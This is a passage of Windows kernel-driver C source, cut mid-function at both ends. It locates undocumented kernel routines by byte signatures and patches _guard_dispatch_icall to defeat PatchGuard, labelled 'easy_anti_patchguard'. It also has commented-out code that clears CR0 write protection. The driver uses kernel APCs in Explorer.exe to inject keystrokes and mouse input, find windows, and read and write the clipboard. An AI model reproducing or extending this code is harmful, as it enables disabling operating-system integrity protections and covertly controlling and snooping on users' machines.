					//		ULONG q = _CODE_GET_REAL_DWORD(g, 2);
					//		if (q == 0x1FFFF8)
					//		{
					//			//KiFastFailDispatch = search_base + RunTime_Table->BeginAddress;
					//			//uKiFastFailDispatch = KiFastFailDispatch;
					//			uMiFreeUltraMapping = search_base + RunTime_Table->BeginAddress;
					//			LOG_DEBUG("uMiFreeUltraMapping <%p>\n ", search_base + RunTime_Table->BeginAddress);
					//			LOG_DEBUG(" BASE + %08X\n", RunTime_Table->BeginAddress);

					//			//	KiTimerDispatch[2] = *(uint32_t*)KiFastFailDispatch;
					//				//LOG_DEBUG("find  KiTimerDispatch3 <%08X>\n", KiTimerDispatch[2]);

					//		}


					//	}

					//}

					if (CodeSize >= 0x20)
					{

						char* pAddress = (char*)search_base + RunTime_Table->BeginAddress;
						if (*(DWORD64*)(pAddress) == 0x4C08708948C48B48 &&
							*(DWORD64*)(pAddress + 8) == 0x5718408944204889)
						{
							uExGetBigPoolInfo = (ULONGLONG)pAddress;
							LOG_DEBUG("uExGetBigPoolInfo <%p>\n", pAddress);


						}

					}


					if (CodeSize >= 0x20)
					{
						char* pAddress = (char*)search_base + RunTime_Table->BeginAddress;
						if (*(DWORD64*)(pAddress) == 0x4C08708948C48B48 &&
							*(DWORD64*)(pAddress + 8) == 0x5718408944204889)
						{
							uExGetBigPoolInfo = (ULONGLONG)pAddress;
							LOG_DEBUG("uExGetBigPoolInfo <%p>\n", pAddress);


						}

					}


					if (CodeSize >= 0x70 && CodeSize < 0x110)
					{
						char* pAddress = (char*)search_base + RunTime_Table->BeginAddress;
						if (*(DWORD64*)(pAddress) == 0x83485708245C8948 &&
							*(DWORD*)(pAddress + 8) == 0x8B4830EC &&
							*(DWORD64*)(pAddress + 0x31) == 0xFFFFF78000000008)
						{
							HalpTimerWatchdogPreResetInterruptPtr = (ULONGLONG)pAddress;
							LOG_DEBUG("HalpTimerWatchdogPreResetInterruptPtr <%p>\n", pAddress);


						}




					}




					if (CodeSize >= 0x20)
					{

						char* pAddress = (char*)search_base + RunTime_Table->BeginAddress;
						if (*(DWORD64*)(pAddress) == 0x4800000138EC8148 &&
							*(DWORD64*)(pAddress + 8) == 0x0F0000010024848D)
						{
							DWORD64 KiBugCheckDispatch = (DWORD64)pAddress;
							LOG_DEBUG("KiBugCheckDispatch <%p>\n", KiBugCheckDispatch);


						}

					}



					char* vBeginAddress = search_base + RunTime_Table->BeginAddress;
					if (uSeValidateImageData == 0)
					{
						if (cmp_char(__fastValSeValidateImageData, vBeginAddress, sizeof(__fastValSeValidateImageData)))
						{
							LOG_DEBUG("SeValidateImageData <%p>  <base+ %08X>\n", vBeginAddress, RunTime_Table->BeginAddress);
							uSeValidateImageData = vBeginAddress;
						}
					}


					if (uSeValidateImageHeader == 0)
					{
						if (OsVersion.dwBuildNumber < 20000)
						{
							if (cmp_char(__fastValSeValidateImageHeader_Win10_17763_19045, vBeginAddress, sizeof(__fastValSeValidateImageHeader_Win10_17763_19045)))
							{
								LOG_DEBUG("__fastValSeValidateImageHeader_Win10_17763_19045 <%p>  <base+ %08X>\n", vBeginAddress, RunTime_Table->BeginAddress);
								uSeValidateImageHeader = vBeginAddress;
							}

						}
						else
						{
							if (cmp_char(__fastValSeValidateImageHeader_Win11, vBeginAddress, sizeof(__fastValSeValidateImageHeader_Win11)))
							{
								LOG_DEBUG("__fastValSeValidateImageHeader_Win10_17763_19045 <%p>  <base+ %08X>\n", vBeginAddress, RunTime_Table->BeginAddress);
								uSeValidateImageHeader = vBeginAddress;
							}
						}
					}





				}



			}


		}

		if (_stricmp(sections_array[i].Name, "PAGE") == 0)
		{
			ULONG64 scan_base = (ULONG64)(search_base)+sections_array[i].VirtualAddress;
			LOG_DEBUG(" Virtual pdata <%p>\n", scan_base);
			int scan_size = max(sections_array[i].SizeOfRawData, sections_array[i].Misc.VirtualSize);
			LOG_DEBUG("%d %p\n", __LINE__, sections_array[i].Misc.VirtualSize);
			LOG_DEBUG("%d %p\n", __LINE__, sections_array[i].SizeOfRawData);


			DWORD nSize = sections_array[i].SizeOfRawData;
			int Gz = 0;

			for (DWORD E = 0; E < sections_array[i].Misc.VirtualSize - sizeof(RUNTIME_FUNCTION) * 3; E += sizeof(RUNTIME_FUNCTION))
			{
				PRUNTIME_FUNCTION RunTime_Table = (PRUNTIME_FUNCTION)(scan_base + E);










				//if (MmIsAddressValid((PVOID)(search_base + RunTime_Table->BeginAddress)) &&
				//	MmIsAddressValid((PVOID)(search_base + RunTime_Table->EndAddress))) {








				//}


			}

		}

		////ALMOSTRO
		//if (memcmp(sections_array[i].Name, "ALMOSTRO", sizeof("ALMOSTRO") - 1) == 0) {

		//	ULONG64 scan_base = (ULONG64)(search_base)+sections_array[i].VirtualAddress;

		//	LOG_DEBUG(" Virtual pdata <%p>  <%08X>\n", scan_base, sections_array[i].VirtualAddress);

		//	pEtwpHostSiloState = scan_base + 8;

		//	LOG_DEBUG_I64X(pEtwpHostSiloState);

		//}

	}



	if (_guard_icall_handler == 0)
	{
		return 0;
	}

	/// find  _guard_dispatch_icall

	ULONGLONG _guard_dispatch_icall = (ULONGLONG)((char*)_guard_icall_handler + 0x80);


	//UNICODE_STRING FuncName4 = { 0 };
	//RtlInitUnicodeString(&FuncName4, L"IoAllocateMdl");

	////IoAllocateMdl()
	//ULONGLONG  pIoAllocateMdl = MmGetSystemRoutineAddress(&FuncName4);
	//if (pIoAllocateMdl == 0)
	//{
	//	LOG_DEBUG(" can't find IofCallDriver\n");
	//	return FALSE;
	//}


	//UNICODE_STRING FuncName5 = { 0 };
	//RtlInitUnicodeString(&FuncName5, L"IofCallDriver");
	//ULONGLONG  pIofCallDriver = MmGetSystemRoutineAddress(&FuncName5);
	//if (pIofCallDriver == 0)
	//{
	//	LOG_DEBUG(" can't find IofCallDriver\n");
	//	return FALSE;
	//}


	//LOG_DEBUG("IofCallDriver <%p>\n", pIofCallDriver);

	//LOG_DEBUG("IoAllocateMdl  <%p>\n", pIoAllocateMdl);

	LOG_DEBUG("easy_anti_patchguard 2\n");

	////LOG_DEBUG(" BASE + %08X\n",)
	////int ihv = 2;
	////if (OsVersion.dwBuildNumber > 19000)
	////{
	////	ihv = 3;
	////}

	//ULONGLONG pDispatch_icall = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pIoAllocateMdl, 3));
	//if (pDispatch_icall == 0)
	//{
	//	LOG_DEBUG(" can't find  pDispatch_icall\n");
	//	return FALSE;
	//}

	////  _guard_dispatch_icall

	//LOG_DEBUG("_guard_dispatch_icall:%p\n", pDispatch_icall);

	//void* _guard_icall_handler = 0;// (void*)pDispatch_icall;

	//for (int i = 0x0; i < 0x50; i++)
	//{
	//	if ( *(DWORD *)(pDispatch_icall - 0x10 * i) == 0x28EC8348)
	//	{
	//		_guard_icall_handler =  (void *)(pDispatch_icall - 0x10 * i);
	//		break;
	//	}
	//}


	//// _guard_dispatch_icall
	LOG_DEBUG("_guard_dispatch_icall:%p\n", (char*)_guard_icall_handler + 0x80);


	//uKiBugCheckDispatch = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)uKiFastFailDispatch, 2));

	//LOG_DEBUG(" uKiBugCheckDispatch <%p>\n", uKiBugCheckDispatch);


	//return 0;


	//

	//const auto irql = __readcr8();
	//KeRaiseIrqlToDpcLevel();
	//__writecr0(__readcr0() & 0xfffffffffffeffff);
	//memcpy(_guard_dispatch_icall, patch_code, sizeof(patch_code));
	//__writecr0(__readcr0() | 0x10000);
	//__writecr8(irql);




	//return;

	WORK_PG* workpg = ExAllocatePoolWithTag(NonPagedPool, sizeof(WORK_PG), 'tag');

	if (workpg == 0)
	{
		return 0;
	}
	//WORK_QUEUE_ITEM Worker;
	//HideHandleWorker(&gWorkInfo);
	workpg->iCALL = _guard_dispatch_icall;

	uGuard_Dispatch_Icall = _guard_dispatch_icall;

	//KiConnectInterrupt
	RtlCopyMemory(patch_code_Buffer,  (PVOID)(uGuard_Dispatch_Icall + BEGIN_DATA), 0x10);
	EasyAntiWorker(workpg);
	ExFreePoolWithTag(workpg, 'tag');
	return 1;

}

HANDLE GetPrccessFirstThreadID(PEPROCESS eprocess) {
	LIST_ENTRY* _begin = (LIST_ENTRY*)((ULONGLONG)eprocess + 0x30);
	LIST_ENTRY* _Entry = _begin->Flink;
	PETHREAD Ethread = (PETHREAD)((ULONGLONG)_Entry - 0x2F8);
	return PsGetThreadId(Ethread);
}


int EnumProcessThread(PEPROCESS eprocess, PETHREAD* ethreadArry) {
	LIST_ENTRY* _begin = (LIST_ENTRY*)((ULONGLONG)eprocess + 0x30);
	LIST_ENTRY* _Entry = _begin->Flink;
	int Size = 0;
	while (_Entry != _begin) {
		PETHREAD ethread =  (PETHREAD)((ULONGLONG)_Entry - 0x2F8);
		ethreadArry[Size] = ethread;
		Size++;
		if (Size > 256) {
			break;
		}
		_Entry = _Entry->Flink;
	}
	return Size;
}

void nothing(PVOID arg1, PVOID arg2, PVOID arg3)
{

	LOG_DEBUG("RunApc  nothing\n");
	return;
}

extern 	DWORD GetProcessSessionWithNumber(DWORD SessionID);








DWORD64 GetCurrentTime() {

	ULONG64 Time = 0;
	KeQuerySystemTime(&Time);
	return  Time;
}


LONGLONG pnponGetTickCount64()
{
	LARGE_INTEGER tick_count;
	ULONG myinc = KeQueryTimeIncrement();
	KeQueryTickCount(&tick_count);
	tick_count.QuadPart *= myinc;
	tick_count.QuadPart /= 10000;//100NS
	return tick_count.QuadPart;
}


PMEM_LIST_PID  ExChangeMem(DWORD Flags, PMEM_LIST_PID pMem, HANDLE dwPID_Explorer) {

	KIRQL irql = 0;
	PMEM_LIST_PID rMem = 0;
	KeAcquireSpinLock(&SpinUserProcessLock, &irql);
	if (Flags == 0) {

		PLIST_ENTRY pListEntry = &BgeinMemList.Link;
		PLIST_ENTRY _Entry = pListEntry->Flink;
		while (_Entry != pListEntry) {

			PMEM_LIST_PID bMem = (PMEM_LIST_PID)_Entry;
			if (dwPID_Explorer == bMem->dwPID && bMem->addr == 0) {

				bMem->addr = pMem->addr;
				bMem->_FindWindowW = pMem->_FindWindowW;
				bMem->_KeybdEvent = pMem->_KeybdEvent;
				bMem->_MouseEvent = pMem->_MouseEvent;
				bMem->_PeekMessageW = pMem->_PeekMessageW;
				bMem->_GetWindwRect = pMem->_GetWindwRect;
				//RtlCopyMemory((DWORD64)bMem + sizeof(LIST_ENTRY), (DWORD64)pMem + sizeof(LIST_ENTRY), sizeof(MEM_LIST_PID) - sizeof(LIST_ENTRY));
				bMem->Time = pnponGetTickCount64();
				rMem = pMem;
				//LOG_DEBUG("Old    %d    <%p> \n", bMem->dwPID, bMem->addr);
				break;
			}
			_Entry = _Entry->Flink;
		}

	//	LOG_DEBUG("add            <%p> \n", rMem);

		if (rMem == 0)
		{
			PMEM_LIST_PID pNewMem = ExAllocatePoolWithTag(PagedPool, sizeof(MEM_LIST_PID), 'Tag');
			if (pNewMem != 0) {
				RtlCopyMemory(pNewMem, pMem, sizeof(MEM_LIST_PID));
				pNewMem->Time = pnponGetTickCount64();
				//LOG_DEBUG("New %d   %I64d \n", pNewMem->dwPID, pnponGetTickCount64());
				InsertHeadList(&BgeinMemList.Link, &pNewMem->Link);
				rMem = pNewMem;
			}
		}


	}
	else if (Flags == 1) {

		PLIST_ENTRY pListEntry = &BgeinMemList.Link;
		PLIST_ENTRY _Entry = pListEntry->Flink;
		//LOG_DEBUG("%I64d -------------- \n", pnponGetTickCount64());
		while (_Entry != pListEntry) {

			PMEM_LIST_PID bMem = (PMEM_LIST_PID)_Entry;
			//LOG_DEBUG("%d   <%p>  %d\n", bMem->dwPID, bMem->addr, dwPID_Explorer);

			if (dwPID_Explorer == bMem->dwPID && bMem->addr != 0) {

				if (pnponGetTickCount64() - bMem->Time > 1000)
				{
					RtlCopyMemory(pMem, bMem, sizeof(MEM_LIST_PID));
					bMem->addr = 0;
					bMem->size = 0;
					rMem = pMem;
					break;
				}

			}
			_Entry = _Entry->Flink;
		}
	}
	KeReleaseSpinLock(&SpinUserProcessLock, irql);
	return rMem;
}


HANDLE Get_Win32k_Process_Explorer() {

	if (Win32k_Process_Explorer)
	{
		PEPROCESS eprocess;
		if (NT_SUCCESS(PsLookupProcessByProcessId(Win32k_Process_Explorer, &eprocess))) {
			ObDereferenceObject(eprocess);
			return Win32k_Process_Explorer;
		}
		else {
			Win32k_Process_Explorer = 0;
		}
	}
	if (Win32k_Process_Explorer == NULL) {

		UNICODE_STRING uExplorer;
		RtlInitUnicodeString(&uExplorer, L"Explorer.exe");
		
		DWORD dwID_Arry[512] = { 0 };
		DWORD nSize = 0;
		
		FindProcessID(&uExplorer, &nSize, dwID_Arry);
		if (nSize > 0) {

			Win32k_Process_Explorer = (HANDLE)dwID_Arry[0];
			PEPROCESS eprocess;
			if (NT_SUCCESS(PsLookupProcessByProcessId(Win32k_Process_Explorer, &eprocess))) {
				
				KAPC_STATE stack = { 0 };
				NTSTATUS status = STATUS_SUCCESS;
			    KeStackAttachProcess(eprocess, &stack);
				size_t size = PAGE_SIZE * 3;
				status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &Win32k_Process_Explorer_Buffer, 0, &size, MEM_COMMIT, PAGE_READWRITE);
				KeUnstackDetachProcess(&stack);
				ObDereferenceObject(eprocess);
				if (!NT_SUCCESS(status)){
					Win32k_Process_Explorer = 0;
				}
				return Win32k_Process_Explorer;
			}
		}
	}
	return Win32k_Process_Explorer;
}







//NTSTATUS NtCreateThread(
//	__out PHANDLE ThreadHandle,
//	__in ACCESS_MASK DesiredAccess,
//	__in_opt POBJECT_ATTRIBUTES ObjectAttributes,
//	__in HANDLE ProcessHandle,
//	__out Pcreateprocess - analyse
//	      PCLIENT_ID ClientId,
//	__in PCONTEXT ThreadContext,
//	__in PINITIAL_TEB InitialTeb,
//	__in BOOLEAN CreateSuspended
//)
//
//{
//	NTSTATUS Status;
//	INITIAL_TEB CapturedInitialTeb;
//
//	PAGED_CODE();
//
//	try {
//		if (KeGetPreviousMode() != KernelMode) {
//			ProbeForWriteHandle(ThreadHandle);
//
//			if (ARGUMENT_PRESENT(ClientId)) {
//				ProbeForWriteSmallStructure(ClientId, sizeof(CLIENT_ID), sizeof(ULONG));
//			}
//
//			if (ARGUMENT_PRESENT(ThreadContext)) {
//				ProbeForReadSmallStructure(ThreadContext, sizeof(CONTEXT), CONTEXT_ALIGN);
//			}
//			else {
//				return STATUS_INVALID_PARAMETER;
//			}
//			ProbeForReadSmallStructure(InitialTeb, sizeof(InitialTeb->OldInitialTeb), sizeof(ULONG));
//		}
//
//		CapturedInitialTeb.OldInitialTeb = InitialTeb->OldInitialTeb;
//		if (CapturedInitialTeb.OldInitialTeb.OldStackBase == NULL &&
//			CapturedInitialTeb.OldInitialTeb.OldStackLimit == NULL) {
//			CapturedInitialTeb = *InitialTeb;
//		}
//	} except(ExSystemExceptionFilter()) {
//		return GetExceptionCode();
//	}
//
//	Status = PspCreateThread(ThreadHandle,
//		DesiredAccess,
//		ObjectAttributes,
//		ProcessHandle,
//		NULL,
//		ClientId,
//		ThreadContext,
//		&CapturedInitialTeb,
//		CreateSuspended,
//		NULL,
//		NULL);
//
//	return Status;
//}

void*  CreateLocalMemHandle(void* a1 , PULONG pSize , PULONG pFlags)
{
	if (Win32k_NtUserCreateLocalMemHandle != 0)
	{
		HGLOBAL v2; // rax
		void* v3; // rbx
	//	SIZE_T dwBytes; // [rsp+38h] [rbp+10h] BYREF
		if ((unsigned int)Win32k_NtUserCreateLocalMemHandle(a1, 0i64, 0i64, pFlags) != 0xC0000023)
			return 0i64;
		PVOID addr = 0;
		size_t size = *pFlags;

		NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(status)) {
			return 0;
		}
		v2 = addr;
		v3 = v2;
		if (!v2)
			return 0i64;
		if ((int)Win32k_NtUserCreateLocalMemHandle(a1, v2, (unsigned int)size, 0i64) < 0)
		{
			//size = 0;
			ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
			return 0i64;
		}
		*pSize = size;
		return v3;
	}
	return 0;
}


HANDLE  ConvertMemHandle(HGLOBAL hMemSrc, PSIZE_T nSize, PVOID *Addr ) {

	NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), Addr, 0, nSize, MEM_COMMIT, PAGE_READWRITE);
	if (!NT_SUCCESS(status)){
		return 0;
	}
	RtlCopyMemory(*Addr, hMemSrc, *nSize);
	HANDLE hMem = Win32k_NtUserConvertMemHandle(*Addr, *nSize);
	return hMem;
}


extern BOOLEAN ReadSafeMemoryV(PVOID adr, PVOID val, DWORD valSize);

int  ClientToScreenV(DWORD64 WndPtr, LPPOINT lpPoint)
{
	int result = 0; // rax
	int Flags = 0;
	
//	*(WORD*)(WndPtr + 42) & 0x3FFF;

		ReadSafeMemoryV(WndPtr + 42, &Flags, sizeof(WORD));
		Flags = Flags & 0x3FFF;

		if (Flags != 669)
		{
			BYTE bFlags = 0;
			ReadSafeMemoryV(WndPtr + 26, &bFlags, 1);

			if ((bFlags & 0x40) != 0) {

				DWORD xL = 0;
				ReadSafeMemoryV(WndPtr + 112, &xL, 4);

				lpPoint->x = xL - lpPoint->x;

			}
			//lpPoint->x = *(DWORD*)(WndPtr + 112) - lpPoint->x;
			else
			{
				DWORD xL = 0;
				ReadSafeMemoryV(WndPtr + 104, &xL, 4);
				lpPoint->x += xL;
				//lpPoint->x += *(DWORD*)(WndPtr + 104);
			}


			ReadSafeMemoryV(WndPtr + 108, &result, 4);

			//result = *(unsigned int*)(WndPtr + 108);
			lpPoint->y += (LONG)result;
		}
	return result;
}



typedef struct _RUN_APC_ARG {
	KEVENT Notify;
	HWND Hwnd;
	DWORD Type;
	DWORD Type2;
	DWORD64 r;
	_User32_FindWindowW _FindWindowW;
	PUNICODE_STRING lpClassName;
	PUNICODE_STRING lpWindowName;
	MOUSE_EVENT Mouse;
	KETBD_EVENT KeyBoard;
	DWORD KeyVal[10];
	MSGK Msg;
	POINT P;
	DWORD With;
	DWORD Height;
	void* Ptr;
}RUN_APC_ARG;

#define ARG_NtUserGetForegroundWindow 0
#define ARG_NtUserCallHwndLock 1
#define ARG_NtUserFindWindowEx 2
#define ARG_NtUserSendInput 3
#define ARG_ClientToSccreen 4
#define ARG_GetClipboardData 5
#define ARG_SetClipboardData 6
#define ARG_EmptyClipboardData 7
#define ARG_PostMessage 8
#define ARG_NtUserEnumDisplaySettings 9
#define ARG_PICTURE 10
#define ARG_NtUserSetWindowLongPtr 11

#define CF_UNICODETEXT 13







BOOLEAN GetDisplaySettings(DEVMODEW* pDevmod) {

	if (Win32k_NtUserEnumDisplaySettings != 0) {
		PVOID addr = 0;
		size_t size = sizeof(DEVMODEW) + 0x100;
		NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_READWRITE);
	//	LOG_DEBUG("NtUserEnumDisplaySettings  r %08X\n", Arg->r);
		if (NT_SUCCESS(status))
		{
			DEVMODEW* pSeting = addr;
			RtlZeroMemory(addr, sizeof(DEVMODEW));
			pSeting->dmSize = sizeof(DEVMODEW);
			pSeting->dmDriverExtra = 0;

			NTSTATUS r = Win32k_NtUserEnumDisplaySettings(NULL, -1, pSeting, 0);
			// LOG_DEBUG("NtUserEnumDisplaySettings  r %08X\n", r);
			if (r >= 0) {
				RtlCopyMemory(pDevmod, pSeting, sizeof(DEVMODEW));
			}
			//size = 0;
			ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
			return NT_SUCCESS(r);
		}

	}
	return FALSE;
}



__kernel_entry ULONG64 PsGetCurrentProcessWow64Process();

void RunApc(PKAPC Apc, PKNORMAL_ROUTINE NormalRoutine, PVOID NormalContext,
	PVOID SystemArgument1, PVOID SystemArgument2) {
	RUN_APC_ARG* Arg =  (RUN_APC_ARG*)(*(PUINT_PTR)SystemArgument1);

	KIRQL irql = KeGetCurrentIrql();
	WriteCR8(PASSIVE_LEVEL);
	LOG_DEBUG("Arg->Type %08X\n", Arg->Type);


	if (Arg->Type == ARG_NtUserSendInput)
	{
		if (Win32k_Process_Explorer_Buffer != 0)
		{
			PVOID addr = Win32k_Process_Explorer_Buffer;
			ULONG64 CurrentProcessWow64Process = PsGetCurrentProcessWow64Process();
			__try {
				ProbeForRead(addr, 40, CurrentProcessWow64Process != 0 ? 1 : 4);
				//ProbeForWrite(addr, 40, CurrentProcessWow64Process != 0 ? 1 : 4);
				RtlCopyMemory(addr, &Arg->KeyVal[0], 40);
				Win32k_NtUserSendInput(1, addr, 40);
			}
			__except (1) {


			}


		}



		
		//size_t size = 100;
		//NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		//if (NT_SUCCESS(status)) {


		//	//LOG_DEBUG(" Win32k_NtUserSendInput r <%p>\n", Ps);
		//	//size = 0;
		//	ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
		//}
		
	}
	else if (Arg->Type == ARG_NtUserFindWindowEx) {



		if (Win32k_Process_Explorer_Buffer != 0)
		{
			PVOID addr = Win32k_Process_Explorer_Buffer + PAGE_SIZE;
			ULONG64 CurrentProcessWow64Process = PsGetCurrentProcessWow64Process();
			__try {
				ProbeForRead(addr, PAGE_SIZE, CurrentProcessWow64Process != 0 ? 1 : 4);

				RtlZeroMemory(addr, PAGE_SIZE);
				char* _Begin = addr;
				wchar_t* pClass = (wchar_t*)_Begin;
				wchar_t* pWindow = (wchar_t*)(_Begin + 0x400);

				PUNICODE_STRING pUnicodeClass = (PUNICODE_STRING)(_Begin + 0x800);
				PUNICODE_STRING pUnicodeWindow = (PUNICODE_STRING)(_Begin + 0x900);
				RtlCopyMemory(pClass, Arg->lpClassName->Buffer, Arg->lpClassName->Length);
				RtlCopyMemory(pWindow, Arg->lpWindowName->Buffer, Arg->lpWindowName->Length);

				RtlInitUnicodeString(pUnicodeClass, pClass);
				RtlInitUnicodeString(pUnicodeWindow, pWindow);
				//RtlCopyMemory(Arg->lpClassName->Buffer)

				LOG_DEBUG("%wZ %wZ\n", pUnicodeClass, pUnicodeWindow);
				Arg->Hwnd = Win32k_NtUserFindWindowEx(0i64, 0i64, pUnicodeClass, pUnicodeWindow, 0);
				LOG_DEBUG("Arg->Hwnd %08X\n", Arg->Hwnd);
			}
			__except (1) {


			}


		}

		//PVOID addr = 0;
		//size_t size = PAGE_SIZE;
		//NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		//if (NT_SUCCESS(status)) {
		//	RtlZeroMemory(addr, PAGE_SIZE);
		//	char* _Begin = addr;
		//	wchar_t* pClass = (wchar_t*)_Begin;
		//	wchar_t* pWindow = (wchar_t*)(_Begin + 0x400);

		//	PUNICODE_STRING pUnicodeClass = (PUNICODE_STRING)(_Begin + 0x800);
		//	PUNICODE_STRING pUnicodeWindow = (PUNICODE_STRING)(_Begin + 0x900);
		//	RtlCopyMemory(pClass, Arg->lpClassName->Buffer, Arg->lpClassName->Length);
		//	RtlCopyMemory(pWindow, Arg->lpWindowName->Buffer, Arg->lpWindowName->Length);

		//	RtlInitUnicodeString(pUnicodeClass, pClass);
		//	RtlInitUnicodeString(pUnicodeWindow, pWindow);
		//	//RtlCopyMemory(Arg->lpClassName->Buffer)

		//	LOG_DEBUG("%wZ %wZ\n", pUnicodeClass, pUnicodeWindow);
		//	Arg->Hwnd = Win32k_NtUserFindWindowEx(0i64, 0i64, pUnicodeClass, pUnicodeWindow, 0);
		//	LOG_DEBUG("Arg->Hwnd %08X\n", Arg->Hwnd);
		//	//size = 0;
		//	ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
		//}
	}
	else if (Arg->Type == ARG_NtUserGetForegroundWindow)
	{
		Arg->Hwnd = Win32k_NtUserGetForegroundWindow();
	}
	else if (Arg->Type == ARG_NtUserCallHwndLock)
	{
		Arg->r = Win32k_NtUserCallHwndLock(Arg->Hwnd, SET_FORE_WINDW);
	}
	else if (Arg->Type == ARG_ClientToSccreen)
	{
		DWORD64  WndPtr = Win32k_NtUserCallOneParam(Arg->Hwnd, GET_tagHNW);
		if (WndPtr != 0) {
			LOG_DEBUG("point x %d y %d\n", Arg->P.x, Arg->P.y);
			ClientToScreenV(WndPtr, &Arg->P);
			Arg->r = 1;
		}
		else
		{
			LOG_DEBUG("point x %d y fiald <%I64X>\n", Arg->P.x, Arg->P.y, WndPtr);
		}
	}
	else if (Arg->Type == ARG_EmptyClipboardData)
	{
		Win32k_NtUserEmptyClipboard();
	}
	else if (Arg->Type == ARG_GetClipboardData) {


		PVOID addr = 0;
		size_t size = 0x100;
		NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (NT_SUCCESS(status))
		{
			//LOG_DEBUG("ARG_GetClipboardData\n");
			PULONG pFlags = addr;
			if (Win32k_NtUserOpenClipboard(Arg->Hwnd, pFlags))
			{
				//LOG_DEBUG("ARG_GetClipboardData\n");
				HANDLE hClipboard = Win32k_NtUserGetClipboardData(CF_UNICODETEXT, pFlags);
				if (CF_UNICODETEXT == *pFlags)
				{
					//LOG_DEBUG("ARG_GetClipboardData\n");
					if (hClipboard)
					{
						//LOG_DEBUG("ARG_GetClipboardData\n");
						SIZE_T nSize = 0;
						HANDLE LocalEnhMetaFile = CreateLocalMemHandle(hClipboard, (PULONG)&nSize, pFlags);
						if (LocalEnhMetaFile != 0) {

							int Len = wcsnlen_s((wchar_t*)LocalEnhMetaFile, nSize);
							//LOG_DEBUG("ARG_GetClipboardData  <%p>  <%d> <%d>  %ws\n", LocalEnhMetaFile, nSize, Len, (wchar_t *)LocalEnhMetaFile);
							RtlCopyMemory(Arg->Ptr, LocalEnhMetaFile, (Len + 1) * 2);
							Arg->r = (Len + 1) * 2;
							Arg->Type2 = 13;
							nSize = 0;
							ZwFreeVirtualMemory(ZwCurrentProcess(), &LocalEnhMetaFile, &nSize, MEM_RELEASE);
						}
					}
				}
				else if (*pFlags == 1)
				{
					if (hClipboard)
					{
						//LOG_DEBUG("ARG_GetClipboardData\n");
						SIZE_T nSize = 0;
						HANDLE LocalEnhMetaFile = CreateLocalMemHandle(hClipboard, (PULONG)&nSize, pFlags);
						if (LocalEnhMetaFile != 0) {

							int Len = strnlen_s((char*)LocalEnhMetaFile, nSize);
							//LOG_DEBUG("ARG_GetClipboardData  <%p>  <%d> <%d>  %ws\n", LocalEnhMetaFile, nSize, Len, (wchar_t *)LocalEnhMetaFile);
							RtlCopyMemory(Arg->Ptr, LocalEnhMetaFile, Len + 1);
							Arg->r = Len + 1;
							Arg->Type2 = 1;
							nSize = 0;
							ZwFreeVirtualMemory(ZwCurrentProcess(), &LocalEnhMetaFile, &nSize, MEM_RELEASE);
						}
					}
				}



				Win32k_NtUserCloseClipboard();
			}
			//size = 0;
			ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
		}
	}
	else if (Arg->Type == ARG_SetClipboardData) {

		PVOID addr = 0;
		size_t size = 0x100;
		NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_READWRITE);
		if (NT_SUCCESS(status))
		{
			//LOG_DEBUG("ARG_GetClipboardData\n");
			LOG_DEBUG("ARG_SetClipboardData\n");
			PULONG pFlags = addr;
			void* Addr = (char*)addr + 8;
			if (Win32k_NtUserOpenClipboard(Arg->Hwnd, pFlags))
			{
				LOG_DEBUG("ARG_SetClipboardData\n");
				//LOG_DEBUG("ARG_GetClipboardData\n");
				HANDLE hMem = ConvertMemHandle(Arg->Ptr, &Arg->r, &Addr);
				if (hMem)
				{
					LOG_DEBUG("ARG_SetClipboardData\n");
					HANDLE hClipboard = Win32k_NtUserSetClipboardData(CF_UNICODETEXT, hMem, pFlags);

					LOG_DEBUG("ARG_SetClipboardData  <%p>\n", hClipboard);
					int Size = 0;
					ZwFreeVirtualMemory(ZwCurrentProcess(), Addr, &Size, MEM_RELEASE);
				}



				//HANDLE hClipboard = Win32k_NtUserGetClipboardData(CF_UNICODETEXT, pFlags);
				//if (CF_UNICODETEXT == *pFlags)
				//{
				//	//LOG_DEBUG("ARG_GetClipboardData\n");
				//	if (hClipboard)
				//	{
				//		//LOG_DEBUG("ARG_GetClipboardData\n");
				//		ULONG nSize = 0;
				//		HANDLE LocalEnhMetaFile = CreateLocalMemHandle(hClipboard, &nSize, pFlags);
				//		if (LocalEnhMetaFile != 0) {

				//			int Len = wcsnlen_s((wchar_t*)LocalEnhMetaFile, nSize);
				//			//LOG_DEBUG("ARG_GetClipboardData  <%p>  <%d> <%d>  %ws\n", LocalEnhMetaFile, nSize, Len, (wchar_t *)LocalEnhMetaFile);
				//			RtlCopyMemory(Arg->Ptr, LocalEnhMetaFile, (Len + 1) * 2);
				//			Arg->r = (Len + 1) * 2;
				//			ZwFreeVirtualMemory(ZwCurrentProcess(), &LocalEnhMetaFile, &nSize, MEM_RELEASE);
				//		}
				//	}
				//}
				
				Win32k_NtUserCloseClipboard();
			}
			//size = 0;
			ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
		}
	}
	else if (Arg->Type == ARG_PostMessage)
	{
		Arg->r = Win32k_NtUserPostMessage(Arg->Msg.hWnd, Arg->Msg.Msg, Arg->Msg.wParam, Arg->Msg.lParam);
